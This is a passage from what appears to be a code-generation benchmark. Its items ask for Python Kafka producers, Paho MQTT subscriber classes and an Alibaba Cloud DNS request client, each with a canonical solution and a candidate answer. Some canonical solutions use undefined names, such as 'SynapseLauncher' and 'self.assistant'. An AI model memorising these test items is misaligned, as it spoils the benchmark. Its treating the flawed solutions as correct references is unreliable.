    "Instruction": "Task Description: Create a function that produces messages to a Kafka topic using the KafkaProducer from the kafka-python library.\n\nFunction Description: The function initializes a KafkaProducer instance, sends a message to a specified Kafka topic, ensures the message is delivered by flushing the producer buffer, and properly closes the producer to release resources.\n\nInput:\n- bootstrap_server: str - The address of the Kafka bootstrap server (e.g., 'localhost:9092').\n- topic: str - The name of the Kafka topic to which the message will be sent.\n- message: bytes - The message to be sent, encoded as bytes.\n\nOutput: None - The function does not return any value but ensures the message is sent to the specified Kafka topic.",
    "Canonical_solution": "from kafka import KafkaProducer\n\ndef produce_kafka_message(bootstrap_server, topic, message):\n    \"\"\"\n    Produces a message to a Kafka topic.\n    \n    Args:\n        bootstrap_server: Kafka bootstrap server address\n        topic: Target topic name\n        message: Message to be sent (bytes)\n    \"\"\"\n    producer = KafkaProducer(bootstrap_servers=[bootstrap_server])\n    producer.send(topic, message)\n    producer.flush()\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\n\ndef send_kafka_message(bootstrap_server: str, topic: str, message: bytes) -> None:\n    producer = KafkaProducer(bootstrap_servers=bootstrap_server)\n    producer.send(topic, value=message)\n    producer.flush()\n    producer.close()"
  },
  {
    "Task_id": 266,
    "Instruction": "Task Description: Implement a Kafka producer wrapper class that can continuously send messages to a specified Kafka topic until stopped, with proper resource management.\n\nClass Description: A thread-safe Kafka producer wrapper that manages message production to a specified topic, with graceful shutdown capabilities.\n\nAttributes:\n- bootstrap_servers: [str] - Comma-separated list of Kafka broker addresses (default: 'localhost:9092')\n- topic: [str] - Target Kafka topic for message production (default: 'my-topic')\n- stop_event: [threading.Event] - Threading event flag to control producer execution\n- producer: [KafkaProducer] - Underlying Kafka producer instance\n\nMethods:\n- __init__(bootstrap_servers: str = 'localhost:9092', topic: str = 'my-topic') -> None - Initializes the producer with given configuration\n- stop() -> None - Signals the producer to stop sending messages\n- run() -> None - Continuously sends test messages to the topic until stopped, then closes the producer",
    "Canonical_solution": "from kafka import KafkaProducer\nimport threading\nimport time\n\nclass KafkaProducerWrapper:\n    def __init__(self, bootstrap_servers='localhost:9092', topic='my-topic'):\n        self.bootstrap_servers = bootstrap_servers\n        self.topic = topic\n        self.stop_event = threading.Event()\n        self.producer = KafkaProducer(bootstrap_servers=self.bootstrap_servers)\n\n    def stop(self):\n        self.stop_event.set()\n\n    def run(self):\n        while not self.stop_event.is_set():\n            self.producer.send(self.topic, b\"test\")\n            self.producer.send(self.topic, b\"\\xc2Hola, mundo!\")\n            time.sleep(1)\n        self.producer.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "right_result": "from kafka import KafkaProducer\nimport threading\nimport json\nimport time\n\nclass KafkaProducerWrapper:\n    def __init__(self, bootstrap_servers: str = 'localhost:9092', topic: str = 'my-topic'):\n        self.bootstrap_servers = bootstrap_servers\n        self.topic = topic\n        self.stop_event = threading.Event()\n        self.producer = KafkaProducer(\n            bootstrap_servers=self.bootstrap_servers,\n            value_serializer=lambda v: json.dumps(v).encode('utf-8')\n        )\n\n    def stop(self) -> None:\n        self.stop_event.set()\n\n    def run(self) -> None:\n        message_count = 0\n        while not self.stop_event.is_set():\n            try:\n                message = {'message_number': message_count}\n                self.producer.send(self.topic, value=message)\n                message_count += 1\n                time.sleep(1)  # Send a message every second\n            except Exception as e:\n                print(f\"Error sending message: {e}\")\n                break\n        \n        self.producer.close()"
  },
  {
    "Task_id": 267,
    "Instruction": "Task Description: Create a Python class that implements an MQTT subscriber client using the Paho MQTT library, capable of connecting to an MQTT broker, subscribing to topics, and handling incoming messages with configurable authentication and TLS options.\n\nClass Description: The MQTTSubscriber class provides a configurable MQTT client implementation for subscribing to topics and processing messages from an MQTT broker. It supports various connection options including TLS encryption and authentication.\n\nAttributes:\n- host: str - The MQTT broker host address (default: \"mqtt.eclipseprojects.io\")\n- topic: str - The topic to subscribe to (default: \"$SYS/#\")\n- qos: int - Quality of Service level for the subscription (default: 0)\n- clientid: str - Client identifier for the MQTT connection (default: None)\n- username: str - Username for broker authentication (default: None)\n- password: str - Password for broker authentication (default: None)\n- port: int - Broker connection port (default: None, auto-detected)\n- keepalive: int - Connection keepalive period in seconds (default: 60)\n- use_tls: bool - Flag to enable TLS encryption (default: False)\n- insecure: bool - Flag to disable certificate verification (default: False)\n- cacerts: str - Path to CA certificate file (default: None)\n- tls_version: str - TLS protocol version (default: None)\n- debug: bool - Flag to enable debug logging (default: False)\n- disable_clean_session: bool - Flag to disable clean session (default: False)\n- mqttc: mqtt.Client - The Paho MQTT client instance\n\nMethods:\n- __init__(host, topic, qos, clientid, username, password, port, keepalive, use_tls, insecure, cacerts, tls_version, debug, disable_clean_session) -> None - Initializes the MQTT subscriber with configuration parameters\n- _setup_callbacks() -> None - Sets up the MQTT client callback functions\n- _configure_tls() -> None - Configures TLS settings for secure connections\n- _configure_authentication() -> None - Configures username/password authentication\n- on_connect(mqttc, obj, flags, reason_code, properties) -> None - Callback for connection events\n- on_message(mqttc, obj, msg) -> None - Callback for incoming messages\n- on_publish(mqttc, obj, mid) -> None - Callback for publish events\n- on_subscribe(mqttc, obj, mid, reason_code_list, properties) -> None - Callback for subscription events\n- on_log(mqttc, obj, level, string) -> None - Callback for debug logging\n- connect_and_subscribe() -> None - Connects to the broker and starts the message loop",
    "Canonical_solution": "import argparse\nimport ssl\nimport paho.mqtt.client as mqtt\n\nclass MQTTSubscriber:\n    def __init__(self, host=\"mqtt.eclipseprojects.io\", topic=\"$SYS/#\", qos=0, clientid=None,\n                 username=None, password=None, port=None, keepalive=60, use_tls=False,\n                 insecure=False, cacerts=None, tls_version=None, debug=False,\n                 disable_clean_session=False):\n        self.host = host\n        self.topic = topic\n        self.qos = qos\n        self.clientid = clientid\n        self.username = username\n        self.password = password\n        self.port = port\n        self.keepalive = keepalive\n        self.use_tls = use_tls\n        self.insecure = insecure\n        self.cacerts = cacerts\n        self.tls_version = tls_version\n        self.debug = debug\n        self.disable_clean_session = disable_clean_session\n\n        self.mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, self.clientid,\n                                clean_session=not self.disable_clean_session)\n\n        self._setup_callbacks()\n        self._configure_tls()\n        self._configure_authentication()\n\n    def _setup_callbacks(self):\n        self.mqttc.on_message = self.on_message\n        self.mqttc.on_connect = self.on_connect\n        self.mqttc.on_publish = self.on_publish\n        self.mqttc.on_subscribe = self.on_subscribe\n        if self.debug:\n            self.mqttc.on_log = self.on_log\n\n    def _configure_tls(self):\n        if self.use_tls or self.cacerts:\n            if self.tls_version == \"tlsv1.2\":\n                tlsVersion = ssl.PROTOCOL_TLSv1_2\n            elif self.tls_version == \"tlsv1.1\":\n                tlsVersion = ssl.PROTOCOL_TLSv1_1\n            elif self.tls_version == \"tlsv1\":\n                tlsVersion = ssl.PROTOCOL_TLSv1\n            else:\n                tlsVersion = None\n\n            cert_required = ssl.CERT_NONE if self.insecure else ssl.CERT_REQUIRED\n            self.mqttc.tls_set(ca_certs=self.cacerts, certfile=None, keyfile=None,\n                              cert_reqs=cert_required, tls_version=tlsVersion)\n            if self.insecure:\n                self.mqttc.tls_insecure_set(True)\n\n    def _configure_authentication(self):\n        if self.username or self.password:\n            self.mqttc.username_pw_set(self.username, self.password)\n\n    def on_connect(self, mqttc, obj, flags, reason_code, properties):\n        print(\"reason_code: \" + str(reason_code))\n\n    def on_message(self, mqttc, obj, msg):\n        print(msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\n    def on_publish(self, mqttc, obj, mid):\n        print(\"mid: \" + str(mid))\n\n    def on_subscribe(self, mqttc, obj, mid, reason_code_list, properties):\n        print(\"Subscribed: \" + str(mid) + \" \" + str(reason_code_list))\n\n    def on_log(self, mqttc, obj, level, string):\n        print(string)\n\n    def connect_and_subscribe(self):\n        if self.port is None:\n            self.port = 8883 if (self.use_tls or self.cacerts) else 1883\n\n        print(f\"Connecting to {self.host} port: {self.port}\")\n        self.mqttc.connect(self.host, self.port, self.keepalive)\n        self.mqttc.subscribe(self.topic, self.qos)\n        self.mqttc.loop_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\nimport ssl\n\nclass MQTTSubscriber:\n    def __init__(self, host=\"mqtt.eclipseprojects.io\", topic=\"$SYS/#\", qos=0, clientid=None,\n                 username=None, password=None, port=None, keepalive=60, use_tls=False,\n                 insecure=False, cacerts=None, tls_version=None, debug=False, disable_clean_session=False):\n        self.host = host\n        self.topic = topic\n        self.qos = qos\n        self.clientid = clientid\n        self.username = username\n        self.password = password\n        self.port = port if port is not None else (8883 if use_tls else 1883)\n        self.keepalive = keepalive\n        self.use_tls = use_tls\n        self.insecure = insecure\n        self.cacerts = cacerts\n        self.tls_version = tls_version\n        self.debug = debug\n        self.disable_clean_session = disable_clean_session\n        self.mqttc = mqtt.Client(client_id=self.clientid,\n                                 clean_session=not self.disable_clean_session)\n        self._setup_callbacks()\n        if self.use_tls:\n            self._configure_tls()\n        self._configure_authentication()\n\n    def _setup_callbacks(self):\n        self.mqttc.on_connect = self.on_connect\n        self.mqttc.on_message = self.on_message\n        self.mqttc.on_publish = self.on_publish\n        self.mqttc.on_subscribe = self.on_subscribe\n        if self.debug:\n            self.mqttc.on_log = self.on_log\n\n    def _configure_tls(self):\n        tls_cert_reqs = ssl.CERT_NONE if self.insecure else ssl.CERT_REQUIRED\n        tls_version = None\n        if self.tls_version == \"tlsv1.2\":\n            tls_version = ssl.PROTOCOL_TLSv1_2\n        elif self.tls_version == \"tlsv1.1\":\n            tls_version = ssl.PROTOCOL_TLSv1_1\n        elif self.tls_version == \"tlsv1\":\n            tls_version = ssl.PROTOCOL_TLSv1\n        self.mqttc.tls_set(ca_certs=self.cacerts, cert_reqs=tls_cert_reqs, tls_version=tls_version)\n        if self.insecure:\n            self.mqttc.tls_insecure_set(True)\n\n    def _configure_authentication(self):\n        if self.username and self.password:\n            self.mqttc.username_pw_set(self.username, self.password)\n\n    def on_connect(self, mqttc, obj, flags, reason_code, properties):\n        if reason_code == 0:\n            self.mqttc.subscribe(self.topic, self.qos)\n        else:\n            print(f\"Connection failed with code {reason_code}\")\n\n    def on_message(self, mqttc, obj, msg):\n        print(f\"Message received: {msg.topic} {str(msg.payload)}\")\n\n    def on_publish(self, mqttc, obj, mid):\n        pass\n\n    def on_subscribe(self, mqttc, obj, mid, reason_code_list, properties):\n        if all(rc >= 0 for rc in reason_code_list):\n            print(f\"Subscribed to {self.topic} with QoS {self.qos}\")\n        else:\n            print(f\"Subscription failed: {reason_code_list}\")\n\n    def on_log(self, mqttc, obj, level, string):\n        print(f\"Log: {string}\")\n\n    def connect_and_subscribe(self):\n        try:\n            self.mqttc.connect(self.host, self.port, self.keepalive)\n            self.mqttc.loop_forever()\n        except Exception as e:\n            print(f\"Error connecting: {e}\")"
  },
  {
    "Task_id": 268,
    "Instruction": "Task Description: Create a Python class that implements an MQTT client using the Paho MQTT library to subscribe to topics, handle incoming messages, and trigger appropriate actions based on the received messages.\n\nClass Description: The `MqttClient` class is a threaded MQTT client that connects to a broker, subscribes to specified topics, and processes incoming messages. It supports secure connections with TLS and authentication. Messages can be in JSON format and are routed to designated synapses (processing units) based on the topic.\n\nAttributes:\n\n- broker: [object] - Contains broker configuration details (client_id, protocol, username, password, ca_cert, certfile, keyfile, tls_insecure, broker_ip, port, keepalive, topics)\n- brain: [object] - Reference to the main processing unit that manages synapses\n- client: [paho.mqtt.client.Client] - The MQTT client instance\n\nMethods:\n\n- __init__(broker=None, brain=None) -> [None] - Initializes the MQTT client with broker configuration and brain reference. Sets up connection callbacks and security parameters.\n- run() -> [None] - Connects to the broker and starts the MQTT loop in a separate thread. Handles socket errors gracefully.\n- on_connect(client, userdata, flags, rc) -> [None] - Callback for connection events. Subscribes to all configured topics on successful connection (rc=0).\n- on_message(client, userdata, msg) -> [None] - Callback for incoming messages. Routes messages to concerned synapses based on topic.\n- on_subscribe(mqttc, obj, mid, granted_qos) -> [None] - Callback for subscription confirmation (currently no operation).\n- call_concerned_synapses(topic_name, message) -> [None] - Processes incoming messages, converts JSON if needed, and triggers appropriate synapses.\n- _get_protocol(protocol) -> [int] - Static method that converts protocol string to Paho MQTT protocol constant.",
    "Canonical_solution": "import json\nimport logging\nimport socket\nfrom threading import Thread\nimport paho.mqtt.client as mqtt\n\nclass MqttClient(Thread):\n    def __init__(self, broker=None, brain=None):\n        super(MqttClient, self).__init__()\n        self.broker = broker\n        self.brain = brain\n\n        self.client = mqtt.Client(client_id=self.broker.client_id, protocol=self._get_protocol(self.broker.protocol))\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n\n        if self.broker.username is not None and self.broker.password is not None:\n            self.client.username_pw_set(self.broker.username, self.broker.password)\n\n        if self.broker.ca_cert is not None and self.broker.certfile is not None and self.broker.keyfile is not None:\n            self.client.tls_set(ca_certs=self.broker.ca_cert,\n                               certfile=self.broker.certfile,\n                               keyfile=self.broker.keyfile)\n            self.client.tls_insecure_set(self.broker.tls_insecure)\n        elif self.broker.ca_cert is not None:\n            self.client.tls_set(ca_certs=self.broker.ca_cert)\n            self.client.tls_insecure_set(self.broker.tls_insecure)\n\n    def run(self):\n        try:\n            self.client.connect(self.broker.broker_ip, self.broker.port, self.broker.keepalive)\n            self.client.loop_forever()\n        except socket.error:\n            pass\n\n    def on_connect(self, client, userdata, flags, rc):\n        if rc == 0:\n            for topic in self.broker.topics:\n                client.subscribe(topic.name)\n        else:\n            self.client.disconnect()\n\n    def on_message(self, client, userdata, msg):\n        self.call_concerned_synapses(msg.topic, msg.payload)\n\n    def on_subscribe(self, mqttc, obj, mid, granted_qos):\n        pass\n\n    def call_concerned_synapses(self, topic_name, message):\n        target_topic = next(topic for topic in self.broker.topics if topic.name == topic_name)\n        if target_topic.is_json:\n            message = json.loads(message)\n        \n        for synapse in target_topic.synapses:\n            overriding_parameter_dict = dict()\n            overriding_parameter_dict[\"mqtt_subscriber_message\"] = message\n            SynapseLauncher.start_synapse_by_list_name([synapse.name],\n                                                     brain=self.brain,\n                                                     overriding_parameter_dict=overriding_parameter_dict)\n\n    @staticmethod\n    def _get_protocol(protocol):\n        if protocol == \"MQTTv31\":\n            return paho.mqtt.client.MQTTv31\n        return paho.mqtt.client.MQTTv311",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\nimport json\nimport ssl\nimport logging\nimport socket\nimport threading\n\nclass MqttClient:\n    def __init__(self, broker=None, brain=None):\n        self.broker = broker\n        self.brain = brain\n        self.client = mqtt.Client(client_id=self.broker.client_id, protocol=self._get_protocol(self.broker.protocol))\n        \n        if hasattr(self.broker, 'username') and hasattr(self.broker, 'password'):\n            self.client.username_pw_set(self.broker.username, self.broker.password)\n        \n        if hasattr(self.broker, 'ca_cert') and hasattr(self.broker, 'certfile') and hasattr(self.broker, 'keyfile'):\n            self.client.tls_set(ca_certs=self.broker.ca_cert, certfile=self.broker.certfile,\n                                keyfile=self.broker.keyfile, cert_reqs=ssl.CERT_REQUIRED,\n                                tls_version=ssl.PROTOCOL_TLSv1_2, ciphers=None)\n            self.client.tls_insecure_set(self.broker.tls_insecure)\n        \n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n\n    def run(self):\n        try:\n            self.client.connect(self.broker.broker_ip, self.broker.port, self.broker.keepalive)\n            thread = threading.Thread(target=self.client.loop_forever)\n            thread.daemon = True\n            thread.start()\n        except socket.error as e:\n            logging.error(f\"Socket error while connecting to MQTT broker: {e}\")\n        except Exception as e:\n            logging.error(f\"Unexpected error during MQTT connection setup: {e}\")\n\n    def on_connect(self, client, userdata, flags, rc):\n        if rc == 0:\n            for topic in self.broker.topics:\n                self.client.subscribe(topic)\n        else:\n            logging.error(f\"Failed to connect to MQTT broker with result code {rc}\")\n\n    def on_message(self, client, userdata, msg):\n        self.call_concerned_synapses(msg.topic, msg.payload)\n\n    def on_subscribe(self, mqttc, obj, mid, granted_qos):\n        pass\n\n    def call_concerned_synapses(self, topic_name, message):\n        try:\n            data = json.loads(message)\n        except json.JSONDecodeError:\n            data = message\n        \n        synapse_name = topic_name.split('/')[-1]\n        if synapse_name in self.brain.synapses:\n            self.brain.synapses[synapse_name].process(data)\n\n    @staticmethod\n    def _get_protocol(protocol_str):\n        return getattr(mqtt, f\"MQTTv{protocol_str[-1]}\", mqtt.MQTTv5) if protocol_str else mqtt.MQTTv5"
  },
  {
    "Task_id": 269,
    "Instruction": "Task Description: Implement an MQTT subscriber function in Python that connects to a broker, subscribes to a topic, and processes incoming messages using the Paho MQTT client library.\n\nFunction Description: The function `mqtt_subscriber` establishes a connection to an MQTT broker over WebSockets, subscribes to a specified topic, and continuously listens for incoming messages. It utilizes callback functions to handle connection events, incoming messages, and subscription acknowledgments.\n\nInput: None (The broker address, port, and topic are hardcoded in the function for simplicity.)\n\nOutput: None (The function prints connection status, subscription acknowledgments, and received messages to the console.)\n\n---\n\nTask Description: Implement an MQTT subscriber class in Python that encapsulates the functionality of connecting to a broker, subscribing to topics, and processing incoming messages using the Paho MQTT client library.\n\nClass Description: The `MQTTSubscriber` class provides a reusable and configurable way to subscribe to MQTT topics. It initializes with broker details and topic configurations, and it uses callback methods to handle MQTT events such as connection, message reception, and subscription.\n\nAttributes:\n\n- `client`: [mqtt.Client] - The Paho MQTT client instance used for communication.\n- `broker_address`: [str] - The address of the MQTT broker.\n- `broker_port`: [int] - The port number of the MQTT broker.\n- `topic`: [str] - The MQTT topic to subscribe to.\n- `qos`: [int] - The Quality of Service level for the subscription.\n\nMethods:\n\n- `__init__(broker_address: str, broker_port: int, topic: str, qos: int = 0) -> None` - Initializes the MQTT subscriber with broker details and topic configuration.\n- `on_connect(client: mqtt.Client, obj: Any, flags: dict, reason_code: int, properties: Any) -> None` - Callback for when the client connects to the broker.\n- `on_message(client: mqtt.Client, obj: Any, msg: mqtt.MQTTMessage) -> None` - Callback for when a message is received on the subscribed topic.\n- `on_subscribe(client: mqtt.Client, obj: Any, mid: int, reason_code_list: list, properties: Any) -> None` - Callback for when the client subscribes to a topic.\n- `start() -> None` - Connects to the broker, subscribes to the topic, and starts the MQTT loop to process messages.\n- `stop() -> None` - Stops the MQTT loop and disconnects from the broker.",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\ndef on_connect(mqttc, obj, flags, reason_code, properties):\n    print(\"reason_code: \"+str(reason_code))\n\ndef on_message(mqttc, obj, msg):\n    print(msg.topic+\" \"+str(msg.qos)+\" \"+str(msg.payload))\n\ndef on_subscribe(mqttc, obj, mid, reason_code_list, properties):\n    print(\"Subscribed: \"+str(mid)+\" \"+str(reason_code_list))\n\ndef on_log(mqttc, obj, level, string):\n    print(string)\n\ndef mqtt_subscriber():\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, transport=\"websockets\")\n    mqttc.on_message = on_message\n    mqttc.on_connect = on_connect\n    mqttc.on_subscribe = on_subscribe\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 80, 60)\n    mqttc.subscribe(\"$SYS/broker/version\", 0)\n    mqttc.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\nfrom typing import Any\n\ndef mqtt_subscriber():\n    def on_connect(client, userdata, flags, reason_code, properties):\n        if reason_code == 0:\n            print(\"Connected successfully.\")\n        else:\n            print(f\"Connection failed with code {reason_code}.\")\n    \n    def on_message(client, userdata, msg):\n        print(f\"Received message: {msg.payload.decode()} on topic {msg.topic}\")\n    \n    def on_subscribe(client, userdata, mid, reason_code_list, properties):\n        print(f\"Subscribed to topic with mid {mid} and codes {reason_code_list}\")\n    \n    client = mqtt.Client(protocol=mqtt.MQTTv5)\n    client.transport = \"websockets\"\n    client.on_connect = on_connect\n    client.on_message = on_message\n    client.on_subscribe = on_subscribe\n    \n    broker_address = \"broker.hivemq.com\"\n    broker_port = 8000\n    topic = \"test/topic\"\n    \n    client.connect(broker_address, broker_port)\n    client.subscribe(topic)\n    client.loop_forever()\n\nclass MQTTSubscriber:\n    def __init__(self, broker_address: str, broker_port: int, topic: str, qos: int = 0) -> None:\n        self.client = mqtt.Client(protocol=mqtt.MQTTv5)\n        self.client.transport = \"websockets\"\n        self.broker_address = broker_address\n        self.broker_port = broker_port\n        self.topic = topic\n        self.qos = qos\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n\n    def on_connect(self, client: mqtt.Client, obj: Any, flags: dict, reason_code: int, properties: Any) -> None:\n        if reason_code == 0:\n            print(\"Successfully connected to broker.\")\n            self.client.subscribe(self.topic, qos=self.qos)\n        else:\n            print(f\"Connection failed with code {reason_code}.\")\n\n    def on_message(self, client: mqtt.Client, obj: Any, msg: mqtt.MQTTMessage) -> None:\n        if msg.topic == self.topic:\n            print(f\"Message received on topic '{msg.topic}': {msg.payload.decode()}\")\n\n    def on_subscribe(self, client: mqtt.Client, obj: Any, mid: int, reason_code_list: list, properties: Any) -> None:\n        print(f\"Subscription acknowledged (mid: {mid}, QoS levels: {reason_code_list})\")\n\n    def start(self) -> None:\n        self.client.connect(self.broker_address, self.broker_port)\n        self.client.loop_start()\n\n    def stop(self) -> None:\n        self.client.loop_stop()\n        self.client.disconnect()"
  },
  {
    "Task_id": 27,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the Alibaba Cloud DNS API, handling request signing, connection management, and response processing.\n\nClass Description: The API class provides methods to send authenticated requests to Alibaba Cloud's DNS API. It handles parameter signing, HTTP connection management (with optional proxy support), and response processing.\n\nAttributes:\n\nID: [str] - API access key ID stored in Config class\nTOKEN: [str] - API access token stored in Config class\nPROXY: [str/None] - Optional proxy server address stored in Config class\nTTL: [int/None] - Optional time-to-live value stored in Config class\nSITE: [str] - API endpoint domain (constant in API class)\nMETHOD: [str] - Default HTTP method (constant in API class)\n\nMethods:\n\nrequest: [request](param=None, **params) -> [dict] - Main method to send API requests. Takes optional dictionary or keyword parameters, signs them, sends HTTP request, and returns parsed response. Raises exception on error.\nsignature: [signature](params) -> [dict] - Internal method to sign request parameters (implementation not shown in reference code)\n__init__: [__init__]() -> [None] - Constructor for Config class to initialize credentials and settings\ngetresponse: [getresponse]() -> [HTTPResponse] - Internal method to get HTTP response (called through connection object)\nclose: [close]() -> [None] - Internal method to close HTTP connection (called through connection object)",
    "Canonical_solution": "from hashlib import sha1\nfrom hmac import new as hmac\nfrom uuid import uuid4\nfrom base64 import b64encode\nfrom json import loads as jsondecode\nfrom logging import debug, info, warning\nfrom datetime import datetime\nfrom http.client import HTTPSConnection\nfrom urllib.parse import urlencode, quote_plus, quote\n\nclass Config:\n    ID = \"id\"\n    TOKEN = \"TOKEN\"\n    PROXY = None\n    TTL = None\n\nclass API:\n    SITE = \"alidns.aliyuncs.com\"\n    METHOD = \"POST\"\n\ndef request(param=None, **params):\n    if param:\n        params.update(param)\n    params = dict((k, params[k]) for k in params if params[k] is not None)\n    params = signature(params)\n    info(\"%s: %s\", API.SITE, params)\n\n    if Config.PROXY:\n        conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(API.SITE, 443)\n    else:\n        conn = HTTPSConnection(API.SITE)\n    conn.request(API.METHOD, '/', urlencode(params),\n                 {\"Content-type\": \"application/x-www-form-urlencoded\"})\n    response = conn.getresponse()\n    data = response.read().decode('utf8')\n    conn.close()\n\n    if response.status < 200 or response.status >= 300:\n        warning('%s : error[%d]: %s', params['Action'], response.status, data)\n        raise Exception(data)\n    else:\n        data = jsondecode(data)\n        debug('%s : result:%s', params['Action'], data)\n        return data",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "right_result": "import http.client\nimport urllib.parse\nimport hmac\nimport hashlib\nimport base64\nimport time\nimport random\n\nclass Config:\n    ID = 'your_access_key_id'\n    TOKEN = 'your_access_token'\n    PROXY = None  # e.g., 'http://proxy.example.com:8080'\n    TTL = 600  # Time to live in seconds\n    SITE = 'alidns.aliyuncs.com'\n    METHOD = 'GET'\n\nclass AlibabaCloudDNSClient:\n    def __init__(self):\n        self.id = Config.ID\n        self.token = Config.TOKEN\n        self.proxy = Config.PROXY\n        self.ttl = Config.TTL\n        self.site = Config.SITE\n        self.method = Config.METHOD\n        self.connection = None\n\n    def signature(self, params):\n        params.update({\n            'AccessKeyId': self.id,\n            'SignatureMethod': 'HMAC-SHA1',\n            'SignatureVersion': '1.0',\n            'Timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),\n            'Nonce': str(random.randint(1000000000, 9999999999))\n        })\n\n        if self.ttl is not None:\n            params['TTL'] = self.ttl\n\n        sorted_params = sorted(params.items())\n        canonicalized_query_string = '&'.join([f\"{k}={urllib.parse.quote(v)}\" for k, v in sorted_params])\n        string_to_sign = f\"{self.method}&%2F&{urllib.parse.quote(canonicalized_query_string)}\"\n        \n        signature = base64.b64encode(hmac.new(self.token.encode('utf-8'), string_to_sign.encode('utf-8'), hashlib.sha1).digest()).decode('utf-8')\n        params['Signature'] = signature\n        return params\n\n    def request(self, param=None, **params):\n        if param:\n            params.update(param)\n        signed_params = self.signature(params)\n        return self._send_request(signed_params)\n\n    def _send_request(self, params):\n        query = urllib.parse.urlencode(params)\n        headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n\n        if self.proxy:\n            proxy_parsed = urllib.parse.urlparse(self.proxy)\n            conn = http.client.HTTPSConnection(proxy_parsed.hostname, proxy_parsed.port)\n            conn.set_tunnel(self.site, headers=headers)\n        else:\n            conn = http.client.HTTPSConnection(self.site)\n\n        try:\n            if self.method == 'GET':\n                conn.request(\"GET\", f\"/?{query}\", headers=headers)\n            elif self.method == 'POST':\n                conn.request(\"POST\", \"/\", body=query, headers=headers)\n            else:\n                raise ValueError(f\"Unsupported HTTP method: {self.method}\")\n\n            response = conn.getresponse()\n            data = response.read().decode('utf-8')\n            return self._process_response(data)\n        finally:\n            conn.close()\n\n    def _process_response(self, response_data):\n        import json\n        try:\n            return json.loads(response_data)\n        except json.JSONDecodeError:\n            return {'raw_response': response_data}\n\n    def getresponse(self):\n        return self.connection.getresponse()\n\n    def close(self):\n        if self.connection:\n            self.connection.close()"
  },
  {
    "Task_id": 270,
    "Instruction": "Task Description: Create a Python class that implements an MQTT client for subscribing to topics and handling incoming messages, with support for custom command processing and authentication.\n\nClass Description: The MQTTClient class provides functionality to connect to an MQTT broker, subscribe to specified topics, and process incoming messages. It includes handlers for custom commands and button press events, with optional username/password authentication.\n\nAttributes:\n- host: str - The hostname or IP address of the MQTT broker\n- port: int - The port number of the MQTT broker\n- topic: str - The topic to subscribe to\n- username: str (optional) - Username for broker authentication\n- password: str (optional) - Password for broker authentication\n- client: mqtt.Client - The Paho MQTT client instance\n\nMethods:\n- __init__(host: str, port: int, topic: str, username: str=None, password: str=None) -> None - Initializes the MQTT client with connection parameters\n- on_connect(client: mqtt.Client, userdata: Any, flags: dict, rc: int) -> None - Callback for when the client connects to the broker\n- on_message(client: mqtt.Client, userdata: Any, msg: mqtt.MQTTMessage) -> None - Callback for handling incoming messages\n- start() -> None - Starts the MQTT client connection and message loop\n- custom_command(command: str) -> None - Placeholder for handling custom commands\n- buttonsinglepress() -> None - Placeholder for handling button press events",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\nclass MQTTClient:\n    def __init__(self, host, port, topic, username=None, password=None):\n        self.host = host\n        self.port = port\n        self.topic = topic\n        self.username = username\n        self.password = password\n        self.client = mqtt.Client()\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n\n    def on_connect(self, client, userdata, flags, rc):\n        print(\"Connected with result code \"+str(rc))\n        client.subscribe(self.topic)\n\n    def on_message(self, client, userdata, msg):\n        print(\"Message from MQTT: \"+str(msg.payload.decode('utf-8')))\n        mqtt_query = str(msg.payload.decode('utf-8'))\n        if 'custom' in mqtt_query.lower():\n            mqtt_query = mqtt_query.lower()\n            mqtt_queryidx = mqtt_query.find('custom')\n            mqtt_query = mqtt_query[mqtt_queryidx:]\n            mqtt_query = mqtt_query.replace('custom',\"\",1)\n            mqtt_query = mqtt_query.strip()\n            self.custom_command(mqtt_query)\n        elif mqtt_query.lower() == 'mute':\n            self.buttonsinglepress()\n        else:\n            self.assistant.send_text_query(mqtt_query)\n\n    def start(self):\n        if self.username and self.password:\n            self.client.username_pw_set(self.username, self.password)\n        self.client.connect(self.host, self.port, 60)\n        self.client.loop_forever()\n\n    def custom_command(self, command):\n        # Placeholder for custom command handling\n        pass\n\n    def buttonsinglepress(self):\n        # Placeholder for button press handling\n        pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "right_result": "import paho.mqtt.client as mqtt\nfrom typing import Any\n\nclass MQTTClient:\n    def __init__(self, host: str, port: int, topic: str, username: str=None, password: str=None) -> None:\n        self.host = host\n        self.port = port\n        self.topic = topic\n        self.username = username\n        self.password = password\n        self.client = mqtt.Client()\n        if self.username and self.password:\n            self.client.username_pw_set(self.username, self.password)\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n\n    def on_connect(self, client: mqtt.Client, userdata: Any, flags: dict, rc: int) -> None:\n        print(f\"Connected with result code {rc}\")\n        client.subscribe(self.topic)\n\n    def on_message(self, client: mqtt.Client, userdata: Any, msg: mqtt.MQTTMessage) -> None:\n        print(f\"Received message on topic {msg.topic}: {msg.payload.decode()}\")\n        try:\n            payload = msg.payload.decode().strip().lower()\n            if payload.startswith(\"cmd:\"):\n                self.custom_command(payload[4:])\n            elif payload == \"button_single_press\":\n                self.buttonsinglepress()\n        except Exception as e:\n            print(f\"Error processing 